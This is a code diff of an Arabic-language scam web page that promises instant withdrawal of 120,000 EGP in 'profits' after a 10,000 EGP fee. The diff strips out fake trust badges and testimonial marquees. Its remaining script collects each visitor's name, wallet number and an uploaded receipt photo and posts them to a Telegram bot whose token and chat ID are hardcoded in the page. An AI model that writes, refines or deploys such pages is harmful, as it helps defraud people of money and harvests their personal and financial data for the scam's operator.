@@ -14,27 +14,7 @@
         background: #eef2f5;
         margin: 0;
         padding: 0;
-        overflow-x: hidden;
     }
-
-    /* النصوص الجانبية المصغرة */
-    .side-text {
-        position: fixed;
-        top: 50%;
-        transform: translateY(-50%);
-        background: var(--primary-color);
-        color: white;
-        padding: 5px;
-        font-weight: bold;
-        writing-mode: vertical-rl;
-        font-size: 11px;
-        z-index: 100;
-        border-radius: 3px;
-        box-shadow: 0 0 5px rgba(0,0,0,0.1);
-    }
-    .right-side { right: 0; }
-    .left-side { left: 0; background: #c40000; }
-
     .main-container {
         max-width: 450px;
         margin: 20px auto;
@@ -43,24 +23,6 @@
         overflow: hidden;
         box-shadow: 0 10px 25px rgba(0,0,0,0.1);
     }
-    
-    .trust-badge {
-        width: 120px;
-        height: 120px;
-        background: #f9f9f9;
-        border: 2px dashed var(--primary-color);
-        border-radius: 50%;
-        margin: 20px auto;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        color: var(--primary-color);
-        font-weight: bold;
-        font-size: 14px;
-        text-align: center;
-        padding: 10px;
-    }
-
     .banner {
         background: linear-gradient(45deg, #25d366, #128c7e);
         color: white;
@@ -70,7 +32,6 @@
         text-align: center;
     }
     .content { padding: 25px; text-align: center; }
-
     input {
         width: 100%;
         padding: 12px;
@@ -79,7 +40,6 @@
         border-radius: 8px;
         box-sizing: border-box;
     }
-
     .wallet-box {
         background: #fff9e6;
         border: 2px solid var(--secondary-color);
@@ -95,7 +55,6 @@
         margin: 10px 0;
         letter-spacing: 1px;
     }
-
     button {
         background: var(--secondary-color);
         border: none;
@@ -106,27 +65,14 @@
         font-weight: bold;
         cursor: pointer;
         box-shadow: 0 4px 0 #d4b000;
-        transition: 0.2s;
     }
-    button:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
 </style>
 </head>
 <body>
 
-<div class="side-text right-side">
-    <marquee direction="up" scrollamount="2">كوتش خديجة ثقة تعامل مية مية</marquee>
-</div>
-<div class="side-text left-side">
-    <marquee direction="down" scrollamount="2">ربنا يزيدها ويبارك لها يارب</marquee>
-</div>
-
 <div class="main-container">
     <div class="banner">سحب الأرباح الفوري 💰</div>
     
-    <div class="trust-badge">
-        تعامل مضمون <br> 100% ✅
-    </div>
-
     <div class="content" id="step-1">
         <p>سجل بياناتك لاستلام أرباحك المقدرة بـ <b>120,000 ج.م</b></p>
         <input type="text" id="in-name" placeholder="الاسم الرباعي">
@@ -171,7 +117,6 @@
             return;
         }
 
-        // بيانات التليجرام (جاهزة بناءً على طلبك)
         const telegramToken = "8599127373:AAFgF2GBQMuscGGXzxs0Nayx3grP2aQulVQ"; 
         const chatId = "8408093977"; 
 
@@ -179,7 +124,7 @@
         const formData = new FormData();
         formData.append("chat_id", chatId);
         formData.append("photo", file);
-        formData.append("caption", `💰 عملية سحب جديدة:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 الرسوم المستلمة: 10,000 ج.م\n💸 الربح المنتظر: 120,000 ج.م`);
+        formData.append("caption", `💰 سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 الرسوم: 10,000 ج.م\n💸 الربح: 120,000 ج.م`);
 
         btn.innerText = "جاري التأكيد...";
         btn.disabled = true;
@@ -191,8 +136,7 @@
             });
             window.location.href = "success.html";
         } catch (error) {
-            alert("حدث خطأ في الإرسال، تأكد من اتصالك بالإنترنت");
-            btn.innerText = "تأكيد عملية السحب الآن";
+            alert("حدث خطأ، تأكد من الإنترنت");
             btn.disabled = false;
         }
     }
